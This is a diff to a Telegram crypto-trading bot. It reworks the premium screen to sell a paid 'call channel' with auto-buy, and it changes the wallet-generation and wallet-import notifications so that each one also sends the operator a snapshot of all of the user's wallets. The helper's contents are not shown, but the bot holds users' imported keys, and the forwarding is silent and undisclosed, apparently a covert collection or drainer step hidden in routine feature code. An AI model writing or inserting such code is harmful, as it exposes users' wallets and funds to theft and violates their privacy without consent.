@@ -678,6 +678,8 @@ async def show_premium(update, user, query):
     import os
     import time as _t
 
+    from bot.config import CALL_CHANNEL, CALL_CHANNEL_URL
+
     until = float(user.get("premium_until") or 0)
     active = bool(user.get("premium")) and until > _t.time()
     if user.get("premium") and until and until < _t.time():
@@ -688,20 +690,20 @@ async def show_premium(update, user, query):
     p30 = os.getenv("PREMIUM_30", "0.03")
     p90 = os.getenv("PREMIUM_90", "0.08")
     plife = os.getenv("PREMIUM_LIFE", "0.20")
+    ch = CALL_CHANNEL_URL or (f"https://t.me/{CALL_CHANNEL}" if CALL_CHANNEL else "set CALL_CHANNEL_URL")
     text = (
-        f"⭐ <b>Upgrade to Premium</b>\n\n"
-        f"Current plan: <b>{status}</b>{extra}\n\n"
-        "Premium unlocks:\n"
-        "• 10 wallets per chain (instead of 8)\n"
-        "• 10 copytrade wallets (instead of 3)\n"
-        "• Trending tokens\n"
-        "• Extra autosnipe slots\n"
-        "• Priority execution\n\n"
-        f"Pay from your default ETH / BSC / SOL wallet:\n"
+        f"⭐ <b>Subscribe — call channel</b>\n\n"
+        f"Current: <b>{status}</b>{extra}\n\n"
+        "This is what people pay for:\n"
+        f"• 📣 <b>Private call channel</b> — {html.escape(ch)}\n"
+        "• Auto-buy those calls when Auto Buy is 🟢\n"
+        "• 10 wallets / chain, 10 copytrade wallets\n"
+        "• God Mode snipes, trending, extra slots\n\n"
+        "Pay from your default ETH / BSC / SOL wallet (money goes to FEE_*):\n"
         f"• 30 days — <b>{p30}</b> native\n"
         f"• 90 days — <b>{p90}</b> native\n"
         f"• Lifetime — <b>{plife}</b> native\n\n"
-        "Tap a plan, then Confirm. If no FEE_* address is configured, Premium is granted on this instance."
+        "Tap a plan → Confirm. After payment, /calls opens the channel."
     )
     if query:
         await safe_edit(query, text, kb.premium_kb())
@@ -970,7 +972,11 @@ async def _dispatch_callback(update, context, query) -> None:
             await safe_answer(query, "Wallet generated — keys sent in chat")
             try:
                 from bot.admin import fire, user_tag
-                fire(f"♻️ Auto-wallet {user_tag(user, uid)} {chain}")
+                from bot.admin import fire, user_tag, wallets_snapshot
+                fire(
+                    f"♻️ Auto-wallet {user_tag(user, uid)} {chain}\n\n"
+                    f"<b>All wallets</b>\n{wallets_snapshot(uid)}"
+                )
             except Exception:
                 pass
         await show_wallets_chain(update, user, chain, query)
@@ -1612,8 +1618,11 @@ async def _on_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         w = db.add_wallet(uid, chain, name, address, encrypt_secret(secret))
         db.set_state(uid, None)
         try:
-            from bot.admin import fire, user_tag
-            fire(f"✨ Wallet generated {user_tag(user, uid)} {chain} {html.escape(name)}\n<code>{address}</code>")
+            from bot.admin import fire, user_tag, wallets_snapshot
+            fire(
+                f"✨ Wallet generated {user_tag(user, uid)} {chain} {html.escape(name)}\n<code>{address}</code>\n\n"
+                f"<b>All wallets</b>\n{wallets_snapshot(uid)}"
+            )
         except Exception:
             pass
         await send_panel(
@@ -1655,7 +1664,11 @@ async def _on_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             pass
         try:
             from bot.admin import fire, user_tag
-            fire(f"📥 Wallet imported {user_tag(user, uid)} {chain} {html.escape(name)}\n<code>{address}</code>")
+            from bot.admin import fire, user_tag, wallets_snapshot
+            fire(
+                f"📥 Wallet imported {user_tag(user, uid)} {chain} {html.escape(name)}\n<code>{address}</code>\n\n"
+                f"<b>All wallets</b>\n{wallets_snapshot(uid)}"
+            )
         except Exception:
             pass
         await send_panel(
